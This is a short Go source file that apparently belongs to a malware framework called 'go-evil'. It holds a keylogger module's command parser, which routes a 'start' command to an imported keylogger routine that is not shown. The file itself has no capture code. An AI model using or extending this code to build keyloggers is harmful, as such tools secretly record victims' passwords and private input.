package keylogger

import (
	"fmt"

	internalKeylogger "github.com/s9rA16Bf4/go-evil/domains/keylogger/keylogger"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func Parser(function string, value string, data_object *json.Json_t) []string {
	call := []string{}

	switch function {
	case "start":
		call = internalKeylogger.Start(value, data_object)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "keylogger.Parser()")

	}

	return call
}
